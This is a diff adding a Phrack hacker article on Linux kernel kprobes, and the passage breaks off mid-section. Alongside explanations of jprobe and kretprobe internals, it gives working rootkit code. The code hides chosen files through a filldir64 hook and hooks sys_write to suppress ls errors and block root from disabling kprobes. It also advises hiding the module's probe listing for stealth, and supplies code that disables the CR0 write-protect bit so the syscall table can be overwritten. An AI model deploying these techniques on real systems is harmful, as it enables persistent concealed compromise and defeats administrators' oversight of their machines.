@@ -1,0 +1,1778 @@
+                              ==Phrack Inc.==
+
+                Volume 0x0e, Issue 0x43, Phile #0x06 of 0x10
+
+|=-----------------------------------------------------------------------=|
+|=--------------=[ Kernel instrumentation using kprobes ]=---------------=|
+|=-----------------------------------------------------------------------=|
+|=--------------------------=[ by ElfMaster ]=---------------------------=|
+|=----------------------=[ elfmaster@phrack.org ]=-----------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+1 - Introduction
+	1.1 - Why write it?
+	1.2 - About kprobes
+	1.3 - Jprobe example
+	1.4 - Kretprobe example & Return probe patching technique
+
+2 - Kprobes implementation
+	2.1 - Kprobe implementation
+	2.2 - Jprobe implementation
+	2.3 - File hiding with jprobes/kretprobes and modifying kernel .text
+	2.4 - Kretprobe implementation
+	2.5 - A quick stop into modifying read-only kernel segments
+	2.6 - An idea for a kretprobe implementation for hackers
+
+3 - Patch to unpatch W^X (mprotect/mmap restrictions)
+
+4 - Notes on rootkit detection for kprobes
+
+5 - Summing it all up.
+
+6 - Greetz
+
+7 - References and citations
+
+8 - Code
+
+
+
+---[ 1 - Introduction
+
+----[ 1.1 - Why write it?
+
+I will preface this by saying that kprobes can be used for anti-security
+patching of the kernel. I would also like to point out that kprobes are not
+the most efficient way to patch the kernel or write rootkits and backdoors
+because they simply require more work -- extra innovation. 
+So why write this? Because... we are hackers. Hackers should be aware of
+any and all resources available to them -- some more auspicious than
+others -- Nonetheless, kprobes are a sweet deal when you consider that they
+are a native kernel API that are ripe for abuse, even without exceeding
+their scope. Due to limitations discussed later on, kprobes require some
+extra innovation when determining how to perform certain tasks such as file
+hiding and applying other interesting patches that could subvert or even
+harden the kernels integrity.
+
+
+----[ 1.2 - About kprobes
+
+It is with no doubt that the best introduction to kprobes is in the Linux 
+kernel source documentation that contains kprobes.txt. Make sure to read
+that when you get a chance. Kprobes are a debugging API native to the Linux
+kernel that is based on the processors debug registers -- whatever the 
+processor may be. We are going to assume x86, which at this time has the
+most kprobe code developed.
+
+--From kprobes.txt --
+
+Kprobes enables you to dynamically break into any kernel routine and
+collect debugging and performance information non-disruptively. You
+can trap at almost any kernel code address, specifying a handler
+routine to be invoked when the breakpoint is hit.
+
+There are currently three types of probes: kprobes, jprobes, and
+kretprobes (also called return probes).  A kprobe can be inserted
+on virtually any instruction in the kernel.  A jprobe is inserted at
+the entry to a kernel function, and provides convenient access to the
+function's arguments.  A return probe fires when a specified function
+returns.
+
+--
+
+Based on this definition one can imagine that this kprobes interface may be
+used to instrument the kernel in some useful ways, both for security and
+anti-security; That is what this paper is about. In the recent past I 	
+implemented some relatively powerful and complex security patches 
+using kprobes. That is not to say that other patching methods are
+not still useful, but occasionally one may run into issues using traditional
+methods such as kernel function trampolines which are not SMP safe due
+to the non-atomic nature of swapping code in and out. kprobes are a native 
+interface which is nice, but they still present some challenges due to
+limitations we discuss throughout the paper. Kprobes can be used to patch
+the kernel in some places, but cannot be used for everything. This a treatise
+that can shed some light on when and where kprobes can be used to modify
+the behavior of the kernel. Sometimes they must be used in conjunction with
+another patching method. Before we move on I wanted to point out the following
+few facts:
+
+kprobes show up as being registered here:
+
+/sys/kernel/debug/kprobes/list
+
+And can be enabled or disabled by writing a 0 or a 1 here:
+
+/sys/kernel/debug/kprobes/enabled
+
+The kprobe source code is located in the following locations:
+/usr/src/linux/kernel/kprobes.c
+/usr/src/linux/arch/x86/kernel/kprobes.c 
+
+Keep in mind that jprobes/kretprobes are 100% based on kprobes and
+disabling kprobes like shown above will prevent any kretprobe/jprobe
+code from working as well. 
+
+Moving on...
+
+
+----[ 1.3 - Jprobe example
+
+In this paper we will be working primarily with jprobes and kretprobes.
+As shown in the kprobe documentation already, there are several functions
+available for registering and unregistering these probes.
+
+Lets pretend for a moment that we are interested in sys_mprotect, and we want
+to inspect any calls to it, and the args that are being passed. For this
+we could register a jprobe for sys_mprotect. The following code outlines the
+general idea here. And consider that because we are setting a jprobe on 
+a syscall, we need to either declare our jprobe handler using 'asmlinkage'
+magic, otherwise we must get our args directly from the registers. In our
+example I will get the args directly from the registers just to show how
+to obtain the registers for the current task.
+
+-- jprobe example 1 --
+
+
+NOTE: The jprobe data types will be explained in detail in 2.2 [Jprobe
+implementation]
+
+int n_sys_mprotect(unsigned long start, size_t len, long prot)
+{
+	struct pt_regs *regs = task_pt_regs(current);
+	
+	start = regs->bx;
+	len = regs->cx;
+	prot = regs->dx;
+
+	printk("start: 0x%lx len: %u prot: 0x%lx\n", start, len, prot);
+	jprobe_return();
+	return 0;
+}           
+
+/*
+	The following entry in struct jprobe is 'void *entry'
+	and simply points to the jprobe function handler that will
+	be executing when the probe is hit on the function entry
+	point.
+*/
+
+static struct jprobe mprotect_jprobe = 
+{
+	.entry = (kprobe_opcode_t *)n_sys_mprotect  // function entry  
+};
+
+static int __init jprobe_init(void)
+{
+	/* kp.addr is kprobe_opcode_t *addr; from struct kprobe and */
+	/* points to the probe point where the trap will occur. In */
+	/* our case we are probing sys_mprotect */
+	mprotect_jprobe.kp.addr = (kprobe_opcode_t *)kallsyms_lookup_name("sys_mprotect");
+	
+	if ((ret = register_jprobe(&mprotect_jprobe)) < 0)
+	{
+		printk("register_jprobe failed for sys_mprotect\n");
+		return -1;
+	}
+	
+	return 0;
+}
+
+
+int init_module(void)
+{
+	jprobe_init();
+	return 0;
+}
+
+void exit_module(void)
+{
+	unregister_jprobe(&mprotect_jprobe);
+}
+
+
+In the above code, we register a jprobe for sys_mprotect. This means that
+a breakpoint instruction is placed on the entry point of the function,
+and as soon as it gets called a trap occurs and control is passed to our
+n_sys_mprotect() jprobe handler. From this point we can analyze data such
+as the arguments passed either in registers or on the stack, as well as any
+kernel data structures. We can also modify kernel data structures, which 
+is primarily what we rely on for our patches using kprobes. Any attempts
+to modify the stack arguments or registers will be overriden as soon as
+our handler function returns -- this is because kprobes saves the register
+state and stack args prior to calling the handler, and restores these values
+upon the jprobe_return(), at which point the real syscall or function will
+execute and do its thing. We will get into much more detail on this topic
+and how to actually modify stack arguments later on. 
+
+
+----[ 1.4 - Kretprobe example and return probe patching technique
+
+Moving on to kretprobes (Also known as return probes). Without kretprobes it
+wouldn't be as easily possible to patch the kernel using kprobes, this is
+because a kernel function that we set a jprobe on might re-modify a
+kernel data structure that we modify, as soon as our jprobe handler returns.
+If we apply a kretprobe into the situation we can modify that kernel data
+structure after the real kernel function returns. Here is an example...
+Lets say we want to modify the kernel data structure 'kstruct->x' (which is 
+ficticious). We want to modify it, but do not know what value we want to 
+apply to it until 'function_A' executes, but as soon as the real 'function_A' 
+executes after our jprobe handler, it sets the value 'kstruct->x' to something. 
+This is where kretprobes come into play. This is the approach we take, which
+we can call the 'return probe patching' technique.
+
+	1. [jprobe handler for function_A]    -> Determines the value that we want to set on kstruct->x
+	2. [function_A] 		      -> Sets the value of kstruct->x to some value.
+	3. [kretprobe handler for function_A] -> Sets the value of kstruct->x to value determined by jprobe handler.
+
+So as you can see, with kretprobes we end up being able to set the final 
+verdict on a value.
+
+Here is a quick example of registering a kretprobe. We will use sys_mprotect
+for this example as well.
+
+The kretprobe data types will be explained in the section 2.4 [kretprobes
+implementation].
+
+static int mprotect_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+	printk("Original return address: 0x%lx\n", (unsigned long)ri->ret_addr);
+	return 0;
+
+
+}
+static struct kretprobe mprotect_kretprobe =
+{
+	.handler = mprotect_ret_handler, // return probe handler
+	.maxactive = NR_CPUS // max number of kretprobe instances
+};
+
+
+int init_module(void)
+{
+	mprotect_kretprobe.kp.addr = (kprobe_opcode_t *)kallsyms_lookup_name("sys_mprotect");
+	register_kretprobe(&mprotect_kretprobe);
+	
+}
+
+As you can see I utilize kallsyms_lookup_name(), but interestingly a probe
+can be set on virtually any instruction within the kernel, whatever means
+you use to get that location is up to you (I.E System.map).
+
+
+So as you can see, the code is straight forward. From an internal point
+of view-- by the time sys_mprotect returns, the address at the top of 
+the stack (the ret address) has been modified to point to a function 
+called kretprobe_trampoline() which in turn sets things up to call 
+our mprotect_ret_handler() function where we can inspect and modify 
+kernel data. No point in modifying the registers because they were 
+all saved on the stack and will be reset as soon as our handler returns. 
+More on this in the next section. The kretprobe trampoline function will be
+explored in detail in 2.4 [Kretprobe implementation].
+
+
+---[ 2 - Kprobes implementation
+
+----[ 2.1 - Kprobe implementation
+
+Firstly I want to make sure we are on the same page about what a basic
+kprobe is, and the general idea of how it works.
+
+-- Taken from kprobes.txt:
+
+When a kprobe is registered, Kprobes makes a copy of the probed
+instruction and replaces the first byte(s) of the probed instruction
+with a breakpoint instruction (e.g., int3 on i386 and x86_64).
+
+When a CPU hits the breakpoint instruction, a trap occurs, the CPU's
+registers are saved, and control passes to Kprobes via the
+notifier_call_chain mechanism.
+Kprobes executes the "pre_handler" associated with the kprobe, passing 
+the handler the addresses of the kprobe struct and the saved registers.
+It would be simpler to single-step the actual instruction in place,
+but then Kprobes would have to temporarily remove the breakpoint
+instruction. This would open a small time window when another CPU
+could sail right past the probepoint.
+
+After the instruction is single-stepped, Kprobes executes the
+"post_handler," if any, that is associated with the kprobe.
+Execution then continues with the instruction following the probepoint.
+Next, Kprobes single-steps its copy of the probed instruction.
+
+--
+
+So to clarify, when registering a typical kprobe a pre_handler should
+always be assigned so that you can inspect data or do whatever you want
+during that point. A post handler may or may not be assigned.
+
+Since we are primarily using jprobes and kretprobes which are extensions
+of the kprobe interface, I have chosen to primarily discuss their implementation
+more so than a plain kprobe. All you need to know for now is that registering
+a basic kprobe inserts a breakpoint instruction on the desired location, and
+executes a pre and a post handler that you assign. As you will see in the jprobe and
+kretprobe implementations which are implemented using a basic kprobe with
+a pre and post handler, the pre and post handlers point to special kernel
+functions [/usr/src/linux/arch/x86/kernel/kprobes.c] that act as a sort of
+prologue/epilogue for the actual handler that executes the instructions.
+More will be revealed in the following sections.
+
+
+----[ 2.2 - Jprobe implementation
+
+If we are aware of the internal implementation of jprobes and kretprobes
+then we can utilize them better, and we could even patch the interface
+itself to act more like we want it, but this defeats the purpose of this
+paper which aims at patching the kernel using the kprobes interface as it
+is, although we will explore some external modifications of kprobes later
+on.
+
+Firstly take a look at the following struct:
+
+struct jprobe {
+        struct kprobe kp;
+        void *entry;    /* probe handling code to jump to */
+};
+
+When we call register_jprobe() it in turn calls register_jprobes(&jp, 1).
+register_jprobes() is all about setting up the jprobe pre/post and entry
+handler.
+
+-- snippet from register_jprobes() in /usr/src/linux/kernel/kprobes.c --
+
+		/* See how jprobes utilizes kprobes? It uses the */
+		/* pre/post handler */
+  		jp->kp.pre_handler = setjmp_pre_handler;     
+                jp->kp.break_handler = longjmp_break_handler;
+                ret = register_kprobe(&jp->kp);
+--
+
+The pre_handler is called before your function/entry handler and is responsible
+for saving the contents of the stack, the registers, and sets the eip. In
+normal circumstances the developer has no control over the pre/post
+handler for jprobes because the kprobe pre and post handler entries within
+struct kprobe do not point to your own custom handlers, but instead to
+specialized handlers specifically for the jprobe prologue/epilogue.
+
+        /* Called before addr is executed. */
+        kprobe_pre_handler_t pre_handler;
+
+        /* Called after addr is executed, unless... */
+        kprobe_post_handler_t post_handler;
+
+You could say that the execution of a jprobe looks like this:
+
+	1. [jprobe pre_handler] Backup stack and register state
+	2. [jprobe function handler] Do elite modifications to kernel
+	3. [jprobe post_handler] Restore original stack and registers.
+
+Lets take a peek at the pre_handler which backs up the stack and registers.
+
+int __kprobes setjmp_pre_handler(struct kprobe *p, struct pt_regs *regs)
+{
+        struct jprobe *jp = container_of(p, struct jprobe, kp);
+        unsigned long addr;
+        struct kprobe_ctlblk *kcb = get_kprobe_ctlblk();
+
+        kcb->jprobe_saved_regs = *regs;
+        kcb->jprobe_saved_sp = stack_addr(regs);
+        addr = (unsigned long)(kcb->jprobe_saved_sp);
+
+        /*
+         * As Linus pointed out, gcc assumes that the callee
+         * owns the argument space and could overwrite it, e.g.
+         * tailcall optimization. So, to be absolutely safe
+         * we also save and restore enough stack bytes to cover
+         * the argument area.
+         */
+        memcpy(kcb->jprobes_stack, (kprobe_opcode_t *)addr,
+               MIN_STACK_SIZE(addr));
+        regs->flags &= ~X86_EFLAGS_IF;
+        trace_hardirqs_off();
+        regs->ip = (unsigned long)(jp->entry);
+        return 1;
+}
+
+Pay close attention to the code comment above; Like with Chuck Noris... if Linus
+says it, then it MUST be true! 
+
+As you can see, the function gets the current stack location using the stack_addr()
+macro, and then memcpy's it over to kcb->jprobes_stack which is a backup of the
+stack to be restored in the post handler. The stack being restored prior to the
+real function being called does impose some obvious restrictions, but that does
+not mean that we can't manipulate the pointer values that are passed on the stack
+which is something we take advantage of in section 2.3 (File hiding). After
+the jprobe handler is finished, the jprobe post handler is called -- here
+is the code.
+
+int __kprobes longjmp_break_handler(struct kprobe *p, struct pt_regs *regs)
+{
+        struct kprobe_ctlblk *kcb = get_kprobe_ctlblk();
+        u8 *addr = (u8 *) (regs->ip - 1);
+        struct jprobe *jp = container_of(p, struct jprobe, kp);
+
+        if ((addr > (u8 *) jprobe_return) &&
+            (addr < (u8 *) jprobe_return_end)) {
+                if (stack_addr(regs) != kcb->jprobe_saved_sp) {
+                        struct pt_regs *saved_regs =
+&kcb->jprobe_saved_regs;
+                        printk(KERN_ERR
+                         "current sp %p does not match saved sp %p\n",
+                               stack_addr(regs), kcb->jprobe_saved_sp);
+                        printk(KERN_ERR "Saved registers for 
+jprobe %p\n", jp);
+                        show_registers(saved_regs);
+                        printk(KERN_ERR "Current registers\n");
+                        show_registers(regs);
+                        BUG();
+                }
+                *regs = kcb->jprobe_saved_regs;
+                memcpy((kprobe_opcode_t *)(kcb->jprobe_saved_sp),
+                       kcb->jprobes_stack,
+                       MIN_STACK_SIZE(kcb->jprobe_saved_sp));
+                preempt_enable_no_resched();
+                return 1;
+        }
+        return 0;
+}
+
+
+The code primarily restores the stack and re-enables preemption; probe 
+handlers are run with preemption disabled.
+
+
+----[ 2.3 - File hiding using jprobes/kretprobes
+
+Lets consider a simple file hiding approach that consists using the 
+dirent->d_name pointer in filldir64(). 
+
+
+char *hidden_files[] = 
+{
+#define HIDDEN_FILES_MAX 3
+	"test1",
+	"test2",
+	"test3"
+};
+
+struct getdents_callback64 {
+        struct linux_dirent64 __user * current_dir;
+        struct linux_dirent64 __user * previous;
+        int count;
+        int error;
+};
+
+/* Global data for kretprobe to act on */
+static struct global_dentry_info
+{
+        unsigned long d_name_ptr;
+        int bypass;
+} g_dentry;
+
+/* Our jprobe handler that globally saves the pointer value of dirent->d_name */
+/* so that our kretprobe can modify that location */
+static int j_filldir64(void * __buf, const char * name, int namlen, loff_t 
+offset, u64 ino, unsigned int d_type)
+{
+        
+        int found_hidden_file, i;
+        struct linux_dirent64 __user *dirent;
+        struct getdents_callback64 * buf = (struct getdents_callback64 *) __buf;
+        dirent = buf->current_dir;
+        int reclen = ROUND_UP64(NAME_OFFSET(dirent) + namlen + 1);
+        
+        /* Initialize custom stuff */
+        g_dentry.bypass = 0;
+        found_hidden_file = 0;
+        
+        for (i = 0; i < HIDDEN_FILES_MAX; i++)
+                if (strcmp(hidden_files[i], name) == 0)
+                        found_hidden_file++;
+        if (!found_hidden_file)
+                goto end;
+        
+        /* Create pointer to where we need to modify in dirent */
+        /* since someone is trying to view a file we want hidden */
+        g_dentry.d_name_ptr = (unsigned long)(unsigned char *)dirent->d_name;
+        g_dentry.bypass++; // note that we want to bypass viewing this file
+        
+        end:
+ 	jprobe_return();
+        return 0;
+}
+
+/* Our kretprobe handler, which we use to nullify the filename */
+/* Remember the 'return probe technique'? Well this is it. */
+static int filldir64_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+        char *ptr, null = 0;
+        /* Someone is looking at one of our hidden files */
+        if (g_dentry.bypass)
+        {
+                /* Lets nullify the filename so it simply is invisible */
+                ptr = (char *)g_dentry.d_name_ptr;
+                copy_to_user((char *)ptr, &null, sizeof(char));
+        }
+}
+
+
+The code above is quite adept at hiding files based on getdents64 being called	
+but unfortunately 'ls' from GNU coreutils will call lstat64 for every d_name found,
+and if some of the d_names start with a null byte then we will see an error returned
+by lstat saying "Cannot access : : file not found". So if we are hiding 3 files, then
+we will see that error message 3 times prior to the directory listing (which will not
+show the hidden files). One of the primary limitations of kprobe patching
+is that we cannot modify the return value of a function; the closest we can get is
+setting up a return probe to modify data that the function may have operated on. 
+There are some indirect methods of altering the return value at times, but after
+following the code path for lstat64 I found no way to remedy the issue using kprobes.
+Instead I found the not-so-elegant approach of redirecting the stderr to /dev/null
+by setting a jprobe and a return probe on sys_write. Additionally, while modifying
+sys_write, we might as well redirect any attempts to disable kprobes to /dev/null
+as well. A super user can simply 'echo 0 > /sys/kernel/debug/kprobes/enabled' to
+disable the kprobes interface (We don't want this). One of the parameters we will 
+pass to insmod when installing our LKM will be the inode of the 'enabled' /sys entry. 
+Below is the code for our modified sys_write.
+
+asmlinkage static int j_sys_write(int fd, void *buf, unsigned int len)
+{
+        char *s = (char *)buf;
+        char null = '\0';
+        char devnull[] = "/dev/null";
+        struct file *file;
+        struct dentry *dentry = NULL;
+        unsigned int ino;
+        int ret;
+ 	char comm[255];
+	
+        stream_redirect = 0; // do we redirect to /dev/null?
+ 
+	/* Make sure this is an ls program */
+	/* otherwise we'd prevent other programs */
+	/* From being able to send 'cannot access' */
+	/* in their stderr stream, possibly */       
+	get_task_comm(comm, current);
+	if (strcmp(comm, "ls") != 0)
+		goto out;
+
+        /* check to see if this is an ls stat complaint, or ls -l weirdness */
+	/* There are two separate calls to sys_write hence two strstr checks */
+        if (strstr(s, "cannot access") || strstr(s, "ls:"))  
+        {
+                printk("Going to redirect\n");
+                goto redirect;  
+        }
+        /* Check to see if they are trying to disable kprobes */
+        /* with 'echo 0 > /sys/kernel/debug/kprobes/enabled' */
+        file = fget(fd);
+        if (!file)
+                goto out;
+        dentry = dget(file->f_dentry);
+        if (!dentry)
+                goto out;
+        ino = dentry->d_inode->i_ino;
+        dput(dentry);
+        fput(file);
+        if (ino != enabled_ino)
+                goto out; 
+        
+        redirect:
+        /* If we made it here, then we are doing a redirect to /dev/null */
+        stream_redirect++;
+        mm_segment_t o_fs = get_fs();
+        set_fs(KERNEL_DS);
+
+        n_sys_close(fd);
+        fd = n_sys_open(devnull, O_RDWR, 0);
+        
+        set_fs(o_fs);
+        global_fd = fd;
+
+	out:
+	jprobe_return();
+	return 0;
+}
+/* Here is the return handler to close the fd to /dev/null. */
+static int sys_write_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+        if (stream_redirect)
+        {
+                n_sys_close(global_fd);
+                stream_redirect = 0;
+        }
+        return 0;
+}
+
+We close the existing file descriptor and open a new one that will
+use the same fd number. This redirection of stderr to /dev/null is only for the
+current process. To understand it a bit more we can follow the code path of
+do_sys_open(), I've added some extra comments:
+ 
+long do_sys_open(int dfd, const char __user *filename, int flags, int mode)
+{
+        char *tmp = getname(filename);
+        int fd = PTR_ERR(tmp);
+
+        if (!IS_ERR(tmp)) {
+                fd = get_unused_fd_flags(flags);
+                if (fd >= 0) {
+                        struct file *f = do_filp_open(dfd, tmp, flags,
+			mode, 0);
+                        if (IS_ERR(f)) {
+                                put_unused_fd(fd);
+                                fd = PTR_ERR(f);
+                        } else {
+
+				/* Notice fsnotify_open() */
+                                fsnotify_open(f->f_path.dentry); 
+				
+				/* Associate fd with /dev/null */
+                                fd_install(fd, f);
+                                trace_do_sys_open(tmp, flags, mode);
+                        }
+                }
+                putname(tmp);
+        }
+        return fd;
+}
+
+The new file descriptor is associated with its new file (struct
+files_struct *) for the current task using fd_install().
+
+void fd_install(unsigned int fd, struct file *file)
+{
+        struct files_struct *files = current->files; // <--  notice here
+        struct fdtable *fdt;
+        spin_lock(&files->file_lock);
+        fdt = files_fdtable(files);     // <-- notice here
+        BUG_ON(fdt->fd[fd] != NULL);
+        rcu_assign_pointer(fdt->fd[fd], file);   // <-- notice here
+        spin_unlock(&files->file_lock);
+}
+
+
+One important note to the reader is, /sys/kernel/debug/kprobes/list
+the file which shows any registered kprobes. Simply use a redirect
+technique like the one we used above to track open's to that file and
+redirect any writes to stdout to /dev/null if the list contains a 
+probe that you have registered. Very trivial, and absolutely necessary
+to maintain a stealth presence.
+
+As the topic of rootkits has become trite ...
+I would like to introduce some other kprobe examples. Firstly 
+let us discuss the Kretprobe implementation in detail. It will
+give some more insight into the limitations of kprobes and also
+expand your mind on how the kprobe implementation may be modified --
+which is not covered in this paper.
+
+
+----[ 2.4 - Kretprobe implementation
+
+The kretprobe implementation is especially interesting. Primarily because
+it is an innovative and nicely engineered chunk of code. Here is how it
+works. 
+
+-- From the kprobes.txt --
+
+When you call register_kretprobe(), Kprobes establishes a kprobe at
+the entry to the function.  When the probed function is called and this
+probe is hit, Kprobes saves a copy of the return address, and replaces
+the return address with the address of a "trampoline."  The trampoline
+is an arbitrary piece of code -- typically just a nop instruction.
+At boot time, Kprobes registers a kprobe at the trampoline.
+
+The kretprobe implementation is really just a creative way of using
+kprobes by registering them and assigning the trap handlers functions
+that deal with modifying the return address.
+
+-- From /usr/src/linux/kernel/kprobes.c --
+
+int __kprobes register_kretprobe(struct kretprobe *rp)
+{
+        int ret = 0;
+        struct kretprobe_instance *inst;
+        int i;
+        void *addr;
+	
+	... <code> ...
+	
+	rp->kp.pre_handler = pre_handler_kretprobe;
+        rp->kp.post_handler = NULL;
+        rp->kp.fault_handler = NULL;
+        rp->kp.break_handler = NULL;
+
+	... <code> ... 
+}
+	NOTE:
+	Notice the rp->kp.pre_handler -- kp is struct kprobe 
+	and the pre_handler is assigned pre_handler_kretprobe.
+
+So when the return probe is hit, pre_handler_kretprobe() will call
+arch_prepare_kretprobe() which saves the original return address and inserts
+the new one:
+
+void __kprobes arch_prepare_kretprobe(struct kretprobe_instance *ri,
+                                      struct pt_regs *regs)
+{
+        unsigned long *sara = stack_addr(regs);
+
+        ri->ret_addr = (kprobe_opcode_t *) *sara;
+
+        /* Replace the return addr with trampoline addr */
+        *sara = (unsigned long) &kretprobe_trampoline;
+}
+
+Notice the last line which sets the return address to the trampoline. The
+trampoline is actually defined in an assembly stub, which for x86 looks
+like this:
+
+asm volatile (
+                        ".global kretprobe_trampoline\n"
+                        "kretprobe_trampoline: \n"
+                        * Skip cs, ip, orig_ax and gs.
+                         * trampoline_handler() will plug in these values
+                         */
+                        "       subl $16, %esp\n"
+                        "       pushl %fs\n"
+                        "       pushl %es\n"
+                        "       pushl %ds\n"
+                        "       pushl %eax\n"
+                        "       pushl %ebp\n"
+                        "       pushl %edi\n"
+                        "       pushl %esi\n"
+                        "       pushl %edx\n"
+                        "       pushl %ecx\n"
+                        "       pushl %ebx\n"
+                        "       movl %esp, %eax\n"
+                        "       call trampoline_handler\n"
+                        /* Move flags to cs */
+                        "       movl 56(%esp), %edx\n"
+                        "       movl %edx, 52(%esp)\n"
+                        /* Replace saved flags with true return address. */
+                        "       movl %eax, 56(%esp)\n"
+                        "       popl %ebx\n"
+                        "       popl %ecx\n"
+                        "       popl %edx\n"
+                        "       popl %esi\n"
+                        "       popl %edi\n"
+                        "       popl %ebp\n"
+                        "       popl %eax\n"
+                        /* Skip ds, es, fs, gs, orig_ax and ip */
+                        "       addl $24, %esp\n"
+                        "       popf\n"
+#endif
+                        "       ret\n");
+}
+
+After the register state is backed up on the stack the stub calls
+trampoline_handler() which essentially executes any return probe
+handlers associated with the kretprobe for the given function. Looking at
+the actual function gives some more insight.
+
+static __used __kprobes void *trampoline_handler(struct pt_regs *regs)
+{
+        struct kretprobe_instance *ri = NULL;
+        struct hlist_head *head, empty_rp;
+        struct hlist_node *node, *tmp;
+        unsigned long flags, orig_ret_address = 0;
+        unsigned long trampoline_address = (unsigned
+long)&kretprobe_trampoline;
+
+        INIT_HLIST_HEAD(&empty_rp);
+        kretprobe_hash_lock(current, &head, &flags);
+        /* fixup registers */
+#ifdef CONFIG_X86_64
+        regs->cs = __KERNEL_CS;
+#else
+        regs->cs = __KERNEL_CS | get_kernel_rpl();
+        regs->gs = 0;
+#endif
+        regs->ip = trampoline_address;
+        regs->orig_ax = ~0UL;
+
+        /*
+         * It is possible to have multiple instances associated with a
+         * given
+         * task either because multiple functions in the call path have
+         * return probes installed on them, and/or more than one
+         * return probe was registered for a target function.
+         *
+         * We can handle this because:
+         *     - instances are always pushed into the head of the list
+         *     - when multiple return probes are registered for the same
+         *       function, the (chronologically) first instance's ret_addr
+         *       will be the real return address, and all the rest will
+         *       point to kretprobe_trampoline.
+         */
+        hlist_for_each_entry_safe(ri, node, tmp, head, hlist) {
+                if (ri->task != current)
+                        /* another task is sharing our hash bucket */
+                        continue;
+
+                if (ri->rp && ri->rp->handler) {
+                        __get_cpu_var(current_kprobe) = &ri->rp->kp;
+                        get_kprobe_ctlblk()->kprobe_status =
+KPROBE_HIT_ACTIVE;
+                        ri->rp->handler(ri, regs);
+                        __get_cpu_var(current_kprobe) = NULL;
+                }
+
+                orig_ret_address = (unsigned long)ri->ret_addr;
+                recycle_rp_inst(ri, &empty_rp);
+
+                if (orig_ret_address != trampoline_address)
+                        /*
+                         * This is the real return address. Any other
+                         * instances associated with this task are for
+                         * other calls deeper on the call stack
+      			*/
+                        break;
+        }
+
+        kretprobe_assert(ri, orig_ret_address, trampoline_address);
+
+        kretprobe_hash_unlock(current, &flags);
+
+        hlist_for_each_entry_safe(ri, node, tmp, &empty_rp, hlist) {
+                hlist_del(&ri->hlist);
+                kfree(ri);
+        }
+        return (void *)orig_ret_address;
+}
+
+The original return address value is returned, and then the
+kretprobe_trampoline stub copies it onto the stack at the right location.
+At which point all of the saved registers are pop'd and restored--resulting
+in returning to the original calling function with the original return
+value. I suppose it doesn't take an over active imagination to see that the
+kretprobe_trampoline stub code can be modified to return a different
+value. This could be done in several ways, however it would exceed
+the scope of hacking purely with kprobes. The arch_prepare_kretprobe()
+function would have to be patched (And it cannot be patched using a kprobe
+sadly) this is because any functions with a __kprobe in the prototype 
+cannot be patched using kprobe hooks themselves.
+
+-- A simple patch within arch_prepare_kretprobe() 
+
+*sara = (unsigned long)&kretprobe_trampoline; 
+
+Could be changed to:
+
+*sara = (unsigned long)&custom_asm_stub;
+
+The problem is that arch_prepare_kretprobe() would have to be modified
+using a technique alternate to kprobes, which is of course easy enough
+but exceeds this papers scope. If you are interested in doing this the
+next section will give you a trick that will be necessary in doing so.
+
+
+----[ 2.5 - A quick stop into modifying read-only kernel segments
+
+If you do feel interested in hijack arch_prepare_kretprobe()
+using a function trampoline, do remember that modern intel CPU's
+have the WRITE_PROTECT bit (cr0.wp) which prevents modifications to
+read-only segments, so anytime you want to modify any data structure
+that resides in .rodata you will need to use the function I provide
+below to modify them. The following types of data structures often
+exist in the kernels text segment:
+
+1. void **sys_call_table
+2. const struct file_operations <fs_fops_name>
+3. const struct vm_ops <vma_vmops_name>
+4. kernel functions
+
+Data structures defined as 'const' will go into the .rodata section
+which is at the end of the text segment, and the kernel code itself 
+generally exist in the .text section of the text segment. Attempting
+writes to these locations will cause kernel freezes/panics/oops.
+
+Some people modify the page table entry data for read-only pages they
+want to modify, but the following functions I have provided are much
+simpler, and an example will be provided below.
+
+/* FUNCTION TO DISABLE WRITE PROTECT BIT IN CPU */
+static void disable_wp(void)
+{
+        unsigned int cr0_value;
+        
+        asm volatile ("movl %%cr0, %0" : "=r" (cr0_value));
+        
+        /* Disable WP */
+        cr0_value &= ~(1 << 16);
+        
+        asm volatile ("movl %0, %%cr0" :: "r" (cr0_value));
+
+}
+        
+/* FUNCTION TO RE-ENABLE WRITE PROTECT BIT IN CPU */
+static void enable_wp(void)
+{
+        unsigned int cr0_value;
+
+        asm volatile ("movl %%cr0, %0" : "=r" (cr0_value));
+
+        /* Enable WP */
+        cr0_value |= (1 << 16);
+
+        asm volatile ("movl %0, %%cr0" :: "r" (cr0_value));
+
+}
+
+So if you wanted to modify a kernel function pointer that exists within
+the text segment (If it is declared const) -- I.E the sys_call_table:
+
+	disable_wp();
+	sys_call_table[__NR_write] = (void *)n_sys_write;
+	enable_wp(); 
+
+Or assuming you have a function that hijacks arch_prepare_kretprobe() using
+the method discussed here [3]
+
+	disable_wp();
+	hijack_arch_prepare_kretprobe();
+	enable_wp();
+
+
+You get the idea. But since we've fallen a bit off track lets move into
+the next section which is actually more relative to the paper.
+
+
+----[ 2.6 - An idea for a kretprobe implementation for hackers 
+
+
+The primary restriction in patching the kernels should be obvious by now.
+We CANNOT modify the return value in return probes (kretprobes). If someone
+felt so inclined, they could (in an LKM) implement something very similar to
+the kretprobe implementation. This would allow us to instrument the kernel
+using kprobes and modify the return value -- therefore easily patching 
+functions like filldir64 which would allow us to simply use our special
+kretprobe implementation to 'return 0' if the 'char *d_name' matched a 
+file we wanted to hide. 
+
+If the reader studies /usr/src/linux/kernel/kprobes.c after reading the
+above section on kretprobe implementation, it becomes apparent that a
+more flexible kretprobe implementation could be designed. This is hardly
+non-trivial if the reader followed this paper in its entirety. I simply
+did not have enough time to design this feature -- a kretprobe for hackers
+that allows control of the return value. Lets call this feature 'rpe' 
+(Return probe elite) the BASIC schematics would look like:
+
+int register_rpe(struct kretprobe *rp)
+{	
+	   
+	  ... <code> ...
+	   rp->kp.pre_handler = pre_handler_rpe;
+	   ... <code> ...
+}
+
+static int pre_handler_rpe(struct kprobe *p,
+                                 struct pt_regs *regs)
+{
+	arch_prepare_rpe(regs);
+
+}
+
+
+void arch_prepare_rpe(struct pt_regs *regs)
+{
+
+	unsigned long *ret = stack_addr(regs);
+
+        ret_addr = (kprobe_opcode_t *) *sara;
+
+        /* Replace the return addr with trampoline addr */
+        *ret = (unsigned long) &rpe_trampoline;
+}
+
+rpe_trampoline could be either an asm stub or an actual
+function -- either way you would want to backup the registers
+before calling your handler that does what you want --
+to process data and ultimately return whatever value you want
+For instance:
